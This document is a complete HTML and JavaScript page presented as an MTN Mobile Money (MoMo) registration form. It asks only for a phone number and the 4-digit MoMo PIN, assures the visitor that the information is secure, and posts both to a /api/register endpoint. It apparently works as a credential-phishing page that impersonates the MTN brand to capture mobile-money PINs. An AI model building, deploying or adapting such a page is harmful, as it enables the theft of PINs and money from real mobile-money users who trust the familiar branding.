<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MTN MoMo Registration</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #FFCC00 0%, #FFB300 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px 30px;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        header { text-align: center; margin-bottom: 30px; }
        header .logo {
            width: 80px; height: 80px;
            background: #FFCC00; border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            margin: 0 auto 15px;
            font-size: 40px; font-weight: bold; color: #000;
        }
        header h1 { color: #333; font-size: 1.8em; }
        header p { color: #666; margin-top: 5px; font-size: 0.95em; }
        .form-group { margin-bottom: 22px; }
        .form-group label {
            display: block; margin-bottom: 8px;
            color: #555; font-weight: 600; font-size: 14px;
        }
        .form-group label .required { color: #f44336; }
        .form-group input {
            width: 100%; padding: 15px;
            border: 2px solid #e0e0e0; border-radius: 10px;
            font-size: 16px; background: #fafafa;
        }
        .form-group input:focus {
            border-color: #FFCC00; outline: none;
            background: white;
            box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.2);
        }
        .btn {
            width: 100%; padding: 16px; border: none;
            border-radius: 10px; font-size: 18px; font-weight: bold;
            cursor: pointer; color: #000; background: #FFCC00;
            margin-top: 10px;
        }
        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .message {
            padding: 15px; border-radius: 10px; margin-top: 15px;
            font-weight: 500; display: none; text-align: center;
        }
        .message.show { display: block; }
        .message.success { background: #d4edda; color: #155724; }
        .message.error { background: #f8d7da; color: #721c24; }
        .loader {
            display: inline-block; width: 18px; height: 18px;
            border: 3px solid rgba(0,0,0,0.2); border-radius: 50%;
            border-top-color: #000;
            animation: spin 0.8s linear infinite;
            vertical-align: middle; margin-right: 8px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .security-note {
            text-align: center; margin-top: 20px;
            font-size: 12px; color: #999;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">MTN</div>
            <h1>MoMo Registration</h1>
            <p>Register your MTN Mobile Money account</p>
        </header>

        <form id="registerForm">
            <div class="form-group">
                <label>MTN Number <span class="required">*</span></label>
                <input type="tel" id="mtnNumber" placeholder="0244123456"
                       pattern="[0-9]*" inputmode="numeric" required autocomplete="off">
            </div>

            <div class="form-group">
                <label>MoMo PIN <span class="required">*</span></label>
                <input type="password" id="momoPin" placeholder="Enter 4-digit PIN"
                       maxlength="4" pattern="[0-9]{4}"
                       inputmode="numeric" required autocomplete="off">
            </div>

            <button type="submit" class="btn" id="submitBtn">
                <span id="submitText">Register</span>
            </button>
        </form>

        <div id="messageDiv" class="message"></div>
        <div class="security-note">🔒 Your information is secure</div>
    </div>

    <script>
        document.getElementById('registerForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            var mtnNumber = document.getElementById('mtnNumber').value.trim();
            var momoPin = document.getElementById('momoPin').value.trim();

            if (!mtnNumber) {
                showMessage('Please enter your MTN number', 'error');
                return;
            }
            if (mtnNumber.length < 10) {
                showMessage('Please enter a valid MTN number (10 digits)', 'error');
                return;
            }
            if (!momoPin || momoPin.length !== 4) {
                showMessage('MoMo PIN must be 4 digits', 'error');
                return;
            }

            var btn = document.getElementById('submitBtn');
            var btnText = document.getElementById('submitText');
            btn.disabled = true;
            btnText.innerHTML = '<span class="loader"></span> Registering...';

            try {
                var response = await fetch('/api/register', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ mtnNumber: mtnNumber, momoPin: momoPin })
                });

                var data = await response.json();

                if (data.success) {
                    localStorage.setItem('registrationId', data.registrationId);
                    localStorage.setItem('mtnNumber', mtnNumber);
                    window.location.href = 'success.html';
                } else {
                    showMessage(data.message || 'Registration failed', 'error');
                    btn.disabled = false;
                    btnText.textContent = 'Register';
                }
            } catch (error) {
                showMessage('Network error. Please try again.', 'error');
                btn.disabled = false;
                btnText.textContent = 'Register';
            }
        });

        document.getElementById('mtnNumber').addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
        });
        document.getElementById('momoPin').addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
        });

        function showMessage(text, type) {
            var div = document.getElementById('messageDiv');
            div.textContent = text;
            div.className = 'message show ' + type;
            setTimeout(function() { div.className = 'message'; }, 5000);
        }
    </script>
</body>
</html>
